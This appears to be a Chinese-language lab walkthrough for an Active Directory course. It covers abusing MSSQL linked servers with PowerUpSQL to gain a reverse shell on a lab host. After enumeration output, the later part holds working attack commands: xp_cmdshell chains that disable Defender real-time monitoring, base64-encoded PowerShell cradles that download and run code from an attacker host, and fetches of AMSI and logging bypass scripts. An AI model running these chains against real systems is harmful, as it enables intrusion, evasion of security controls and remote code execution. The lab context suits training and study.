Task
•  Get a reverse shell on a db-sqlsrv in db.local forest by abusing database links from us-mssql.

这里还是要用powershell枚举，载入到CS有问题

1. 枚举当前账号是否有任何可用的mssql链接

```
PS C:\Windows\system32> cd C:\ad\Tools\
PS C:\ad\Tools> Import-Module .\PowerupSQL-master\PowerupSQL.psd1
WARNING: The names of some imported commands from the module 'PowerupSQL' include unapproved verbs that might make them
 less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
parameter. For a list of approved verbs, type Get-Verb.
PS C:\ad\Tools> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : US-MSSQL
DomainName             : US
ServiceProcessID       : 2216
ServiceName            : MSSQLSERVER
ServiceAccount         : US\dbservice
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : US\studentuser138
IsSysadmin             : No
ActiveSessions         : 1
```

对us-mssql这个实例有进入权限，但我们不是sysadmin（IsSysadmin:No）

2. 查看上面us-mssql这个链接的信息

```
PS C:\ad\Tools> Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : us-mssql.us.techcorp.local
DatabaseLinkId         : 0
DatabaseLinkName       : US-MSSQL
DatabaseLinkLocation   : Local
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : True
is_data_access_enabled : False
modify_date            : 7/7/2019 9:48:29 AM

ComputerName           : us-mssql.us.techcorp.local
Instance               : us-mssql.us.techcorp.local
DatabaseLinkId         : 1
DatabaseLinkName       : 192.168.23.25
DatabaseLinkLocation   : Remote
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : False
is_data_access_enabled : True
modify_date            : 7/9/2019 6:54:54 AM

```

留意第二条枚举信息
```
DatabaseLinkName       : 192.168.23.25
DatabaseLinkLocation   : Remote
Product                : SQL Server
```

这里表示在us-mssql还有一个远程的mssql链接

3. 使用HeidiSQL客户端

以当前用户身份登录


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667866844266.png)


使用 PowerUpSQL 中的 Get-SQLServerLinkCrawl 来自动爬取数据库链接

```
PS C:\ad\Tools> Get-SQLServerLinkCrawl -Instance us-mssql -Verbose

Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser138
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :

```

从上面枚举结果可知，对DB-SQLSRV有sa权限

如果启用了 xp_cmdshell（或者 rpcout 值为true，允许我们启用 xp_cmdshell），则可以使用以下命令在数据库链接中的任何节点上执行命令。

尝试对各个mssql节点执行```whoami```命令

```
PS C:\ad\Tools> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser138
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery : {nt service\mssqlserver, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :
```

上面结果表明我们对 DB-SQLPROD这个实例可以执行系统命令


Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"'''



rportfwd 8080 192.168.99.138 80


Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -w hidden -enc "SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADMAOAA6ADgAMAA4ADAALwBhACIAKQApAA=="'''




PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.100.138:8080/a"))'
PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADMAOAA6ADgAMAA4ADAALwBhACIAKQApAA==



SELECT * FROM OPENQUERY( "DB-SQLPROD" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOQA5AC4AMQAzADgAOgA4ADAALwBhACIAKQApAA==''' )



Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);IEX ((new-object net.webclient).downloadstring(\"http://192.168.100.138:8080/a\"))"'''